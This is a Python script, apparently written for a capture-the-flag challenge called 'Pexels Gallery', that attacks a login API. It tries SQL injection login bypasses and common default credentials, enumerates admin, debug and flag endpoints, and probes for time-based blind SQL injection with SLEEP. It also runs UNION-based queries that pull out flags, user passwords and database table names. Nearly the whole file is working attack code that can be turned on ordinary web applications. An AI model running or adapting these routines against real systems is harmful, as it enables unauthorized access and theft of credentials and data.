#!/usr/bin/env python3
"""
Pexels Gallery CTF Exploit Script
Tests for SQL injection, auth bypass, and API endpoint enumeration
"""
import requests
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "http://c1.arena.airoverflow.com:21204"

def test_sql_injection():
    """Test various SQL injection payloads on login"""
    print("[*] Testing SQL Injection on /api/login...")
    
    sqli_payloads = [
        {"username": "admin' OR '1'='1", "password": "anything"},
        {"username": "admin'--", "password": "anything"},
        {"username": "admin' OR 1=1--", "password": "anything"},
        {"username": "' OR '1'='1' --", "password": "anything"},
        {"username": "' OR 1=1--", "password": "password"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "admin", "password": "' OR 1=1--"},
        {"username": "' UNION SELECT NULL, NULL--", "password": "anything"},
        {"username": "admin'/*", "password": "*/OR/**/1=1--"},
    ]
    
    for payload in sqli_payloads:
        try:
            r = requests.post(f"{TARGET}/api/login", json=payload, verify=False, timeout=5)
            if r.status_code == 200:
                print(f"[+] SUCCESS with payload: {payload}")
                print(f"[+] Response: {r.text}")
                return r.json().get('token')
            elif r.status_code != 401:
                print(f"[?] Interesting response ({r.status_code}): {payload} -> {r.text[:100]}")
        except Exception as e:
            print(f"[-] Error with {payload}: {e}")
    
    return None

def enumerate_endpoints(token=None):
    """Enumerate common API endpoints"""
    print("\n[*] Enumerating API endpoints...")
    
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    endpoints = [
        '/api/users',
        '/api/user',
        '/api/profile',
        '/api/admin',
        '/api/flag',
        '/api/photos',
        '/api/images',
        '/api/gallery',
        '/api/debug',
        '/api/config',
        '/api/status',
        '/api/health',
        '/flag',
        '/flag.txt',
        '/admin',
        '/debug',
    ]
    
    for endpoint in endpoints:
        try:
            r = requests.get(f"{TARGET}{endpoint}", headers=headers, verify=False, timeout=3)
            if r.status_code != 404:
                print(f"[+] Found: {endpoint} (Status: {r.status_code})")
                print(f"    Response: {r.text[:200]}")
                if 'flag' in r.text.lower() or 'ARENA{' in r.text:
                    print(f"[!] POSSIBLE FLAG FOUND!")
                    return r.text
        except Exception as e:
            pass
    
    return None

def test_common_creds():
    """Test common credentials"""
    print("\n[*] Testing common credentials...")
    
    creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
        ("root", "root"),
        ("administrator", "password"),
    ]
    
    for username, password in creds:
        try:
            r = requests.post(f"{TARGET}/api/login", 
                            json={"username": username, "password": password},
                            verify=False, timeout=3)
            if r.status_code == 200:
                print(f"[+] Valid credentials: {username}:{password}")
                print(f"[+] Response: {r.text}")
                return r.json().get('token')
        except Exception as e:
            pass
    
    return None

def blind_sqli_check():
    """Check for blind SQL injection using timing"""
    print("\n[*] Testing for blind SQL injection...")
    
    payloads = [
        {"username": "admin' AND SLEEP(3)--", "password": "test"},
        {"username": "admin' OR '1'='1' AND SLEEP(3)--", "password": "test"},
    ]
    
    for payload in payloads:
        try:
            import time
            start = time.time()
            r = requests.post(f"{TARGET}/api/login", json=payload, verify=False, timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 2.5:
                print(f"[+] Possible time-based blind SQLi detected (delay: {elapsed:.2f}s)")
                print(f"    Payload: {payload}")
                return True
        except Exception as e:
            pass
    
    return False

def extract_data_with_sqli():
    """Extract data using SQL injection UNION attack"""
    print("\n[*] Attempting data extraction via UNION-based SQLi...")
    
    # Try to determine number of columns
    for cols in range(1, 10):
        null_union = "' UNION SELECT " + ",".join(["NULL"] * cols) + "--"
        payload = {"username": null_union, "password": "test"}
        
        try:
            r = requests.post(f"{TARGET}/api/login", json=payload, verify=False, timeout=3)
            if r.status_code not in [500, 401]:
                print(f"[+] Found {cols} columns in query")
                
                # Try to extract data
                extraction_payloads = [
                    f"' UNION SELECT {','.join(['NULL'] * (cols-1))}, flag FROM flags--",
                    f"' UNION SELECT {','.join(['NULL'] * (cols-1))}, password FROM users--",
                    f"' UNION SELECT {','.join(['NULL'] * (cols-1))}, group_concat(table_name) FROM information_schema.tables--",
                ]
                
                for ext_payload in extraction_payloads:
                    test_payload = {"username": ext_payload, "password": "test"}
                    r2 = requests.post(f"{TARGET}/api/login", json=test_payload, verify=False, timeout=3)
                    if r2.status_code == 200 or 'ARENA{' in r2.text:
                        print(f"[+] Extraction successful!")
                        print(f"[+] Response: {r2.text}")
                        return r2.text
                
                break
        except Exception as e:
            pass
    
    return None

def main():
    print("=" * 60)
    print("Pexels Gallery CTF Exploit")
    print("Target:", TARGET)
    print("=" * 60)
    
    # Test 1: SQL Injection
    token = test_sql_injection()
    
    # Test 2: Common credentials
    if not token:
        token = test_common_creds()
    
    # Test 3: Enumerate endpoints (both with and without token)
    flag = enumerate_endpoints(token)
    if flag and 'ARENA{' in flag:
        print("\n" + "=" * 60)
        print("[!] FLAG FOUND!")
        print("=" * 60)
        # Extract just the flag
        import re
        flags = re.findall(r'ARENA\{[^}]+\}', flag)
        for f in flags:
            print(f"[+] {f}")
        return
    
    # Test 4: Blind SQL injection
    blind_sqli_check()
    
    # Test 5: UNION-based data extraction
    result = extract_data_with_sqli()
    if result and 'ARENA{' in result:
        print("\n" + "=" * 60)
        print("[!] FLAG FOUND!")
        print("=" * 60)
        import re
        flags = re.findall(r'ARENA\{[^}]+\}', result)
        for f in flags:
            print(f"[+] {f}")
        return
    
    print("\n[*] No flag found yet. Manual analysis may be required.")
    print("[*] If you obtained a token, try authenticated endpoints manually.")

if __name__ == "__main__":
    main()
